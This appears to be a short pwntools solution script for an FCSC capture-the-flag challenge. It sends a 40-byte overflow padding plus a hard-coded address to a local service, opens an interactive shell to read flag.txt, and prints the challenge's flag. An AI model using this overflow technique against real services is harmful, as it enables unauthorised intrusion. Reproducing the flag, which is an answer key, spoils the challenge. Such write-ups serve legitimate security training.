from pwn import *

HOST, PORT = "127.0.0.1", 4000

r = remote(HOST, PORT)

trafic = r.recv()
print(trafic.decode())

r.sendline(b"a"*40 + b"\x88\x77\x66\x55\x44\x33\x22\x11")
r.interactive()

# Write cat flag.txt to retreive the flag
# FCSC{ec30a448a777b571734d8d9e4036b3a6e87d1005446f80dffb26c3e4f5cd02ba}